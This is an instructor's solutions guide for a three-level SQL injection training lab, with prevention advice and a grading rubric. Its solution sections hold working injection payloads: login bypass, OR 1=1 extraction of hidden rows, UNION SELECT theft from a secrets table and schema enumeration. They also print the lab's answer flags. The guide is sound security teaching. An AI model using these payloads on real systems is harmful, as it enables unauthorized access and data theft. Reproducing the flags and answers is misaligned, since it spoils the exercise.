# 🔑 Solutions Guide - SQL Injection Lab

**⚠️ INSTRUCTOR/REFERENCE ONLY**

This document contains complete solutions for all levels. Students should attempt to solve challenges independently before consulting this guide.

---

## 📊 Level 1: Authentication Bypass

### Objective
Bypass the login form to access the admin account without knowing the password.

### Vulnerability
The login endpoint uses string concatenation to build SQL queries:
```javascript
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

### Solution

**Payload:**
- Username: `admin'--`
- Password: (anything, e.g., "test")

**Explanation:**
The single quote closes the username string, and `--` comments out the rest of the query.

**Resulting Query:**
```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = 'test'
```

Everything after `--` is ignored, so the password check is bypassed.

### Alternative Solutions

1. **Using OR logic:**
   - Username: `admin' OR '1'='1`
   - Password: (anything)

2. **Using comment variations:**
   - Username: `admin'#` (MySQL style comment)
   - Username: `admin'/*` (block comment)

### Key Learning Points
- SQL comments (`--`, `#`, `/**/`) can bypass security checks
- String concatenation in SQL queries is dangerous
- Authentication should never rely solely on SQL queries

---

## 📦 Level 2: Hidden Data Extraction

### Objective
Extract hidden products from the database, specifically finding the product with the flag.

### Vulnerability
The search endpoint concatenates user input directly into the WHERE clause:
```javascript
const sqlQuery = `SELECT * FROM products WHERE name LIKE '%${query}%' AND hidden = 0`;
```

### Solution

**Payload:**
```
' OR 1=1--
```

**Explanation:**
This makes the WHERE clause always evaluate to true, returning all products including hidden ones.

**Resulting Query:**
```sql
SELECT * FROM products WHERE name LIKE '%' OR 1=1--%' AND hidden = 0
```

The `1=1` is always true, and the `hidden = 0` check is commented out.

### Alternative Solutions

1. **Using OR with different conditions:**
   ```
   ' OR 'a'='a'--
   ```

2. **Closing the LIKE and adding OR:**
   ```
   %' OR hidden=1--
   ```

3. **Using UNION (advanced):**
   ```
   ' UNION SELECT id, name, description, price, category FROM products WHERE hidden = 1--
   ```

### Expected Result
You should see a product named "Secret Flag Product" with the description containing:
```
FLAG{pr0duct_3xtr4ct10n_m4st3r}
```

### Key Learning Points
- OR logic can bypass filtering conditions
- LIKE queries are particularly vulnerable
- Hidden data can be exposed through injection

---

## 🔐 Level 3: Union-Based Injection

### Objective
Use UNION SELECT to extract the master flag from the `admin_secrets` table.

### Vulnerability
The profile endpoint directly concatenates the userId without validation:
```javascript
const query = `SELECT id, username, email, role FROM users WHERE id = ${userId}`;
```

### Solution

**Payload (Option 1 - with comment):**
```
1 UNION SELECT id, secret_key, secret_value, access_level FROM admin_secrets--
```

**Payload (Option 2 - without comment, cleaner):**
```
1 UNION SELECT id, secret_key, secret_value, access_level FROM admin_secrets
```

**Explanation:**
UNION combines results from two SELECT statements. The column count and types must match.

**Resulting Query:**
```sql
SELECT id, username, email, role FROM users WHERE id = 1 
UNION 
SELECT id, secret_key, secret_value, access_level FROM admin_secrets
```

The FLAG will appear in the "Email" column since `secret_value` (3rd column) maps to `email` (3rd column).

### Step-by-Step Process

1. **Determine column count** (already known: 4 columns)
   - Test with: `1 UNION SELECT 1,2,3,4--`
   - If error, adjust column count

2. **Identify column types** (all can be strings)
   - Test with: `1 UNION SELECT 'a','b','c','d'--`

3. **Extract data from target table:**
   ```
   1 UNION SELECT id, secret_key, secret_value, access_level FROM admin_secrets--
   ```

4. **Find the master flag:**
   - Look for the entry with `access_level = 3`
   - Or filter directly: `1 UNION SELECT id, secret_key, secret_value, access_level FROM admin_secrets WHERE access_level = 3--`

### Expected Result
You should see multiple profile entries, including one with:
```
Username: master_flag
Email: FLAG{un10n_s3l3ct_ch4mp10n}
Role: 3
```

### Alternative Solutions

1. **Extract specific secret:**
   ```
   1 UNION SELECT id, secret_key, secret_value, CAST(access_level AS TEXT) FROM admin_secrets WHERE secret_key = 'master_flag'--
   ```

2. **Order by access level:**
   ```
   1 UNION SELECT id, secret_key, secret_value, access_level FROM admin_secrets ORDER BY access_level DESC--
   ```

3. **Using NULL for type compatibility:**
   ```
   1 UNION SELECT NULL, secret_key, secret_value, NULL FROM admin_secrets--
   ```

### Advanced Techniques (Beyond this lab)

If you didn't know the table structure, you could:

1. **Enumerate tables:**
   ```sql
   1 UNION SELECT 1, name, sql, 4 FROM sqlite_master WHERE type='table'--
   ```

2. **Enumerate columns:**
   ```sql
   1 UNION SELECT 1, sql, 3, 4 FROM sqlite_master WHERE name='admin_secrets'--
   ```

### Key Learning Points
- UNION requires matching column counts
- Data from any table can be extracted
- Knowledge of database schema helps but isn't required
- System tables can reveal database structure

---

## 🛡️ Prevention Methods

### 1. Parameterized Queries (Most Important!)

**Vulnerable:**
```javascript
const query = `SELECT * FROM users WHERE username = '${username}'`;
```

**Secure:**
```javascript
const query = 'SELECT * FROM users WHERE username = ?';
db.get(query, [username], callback);
```

### 2. Input Validation

```javascript
// Validate user ID is a number
const userId = parseInt(req.query.userId, 10);
if (isNaN(userId)) {
  return res.status(400).json({ error: 'Invalid ID' });
}
```

### 3. Use ORM/Query Builders

```javascript
// Using Sequelize
const user = await User.findOne({
  where: { username: username, password: password }
});

// Using Knex
const user = await knex('users')
  .where({ username, password })
  .first();
```

### 4. Least Privilege

- Database users should have minimal permissions
- Read-only access for SELECT operations
- Separate credentials for different operations

### 5. Web Application Firewall (WAF)

- ModSecurity rules
- Cloud WAF (Cloudflare, AWS WAF)
- Detect and block SQL injection patterns

---

## 📈 Grading Rubric (For Instructors)

### Level 1 (30 points)
- Successfully bypasses authentication: 20 points
- Accesses admin account: 10 points

### Level 2 (30 points)
- Retrieves hidden products: 15 points
- Finds the flag: 15 points

### Level 3 (40 points)
- Constructs valid UNION query: 20 points
- Extracts data from admin_secrets: 10 points
- Finds the master flag: 10 points

### Bonus Points (10 points)
- Discovers alternative solutions: 5 points
- Explains prevention methods: 5 points

**Total: 100 points + 10 bonus**

---

## 🎓 Discussion Questions

1. **Why is SQL injection still common despite being well-known?**
   - Legacy code
   - Developer inexperience
   - Time pressure
   - Lack of security awareness

2. **What are the real-world impacts of SQL injection?**
   - Data breaches
   - Financial loss
   - Reputation damage
   - Legal consequences

3. **How can organizations prevent SQL injection?**
   - Secure coding training
   - Code reviews
   - Automated security testing
   - Regular security audits

4. **What other injection attacks exist?**
   - NoSQL injection
   - LDAP injection
   - XML injection
   - Command injection

---

## 📚 Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [SQLMap Tool](http://sqlmap.org/)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

---

**Remember: Use this knowledge ethically and only in authorized environments!** 🛡️
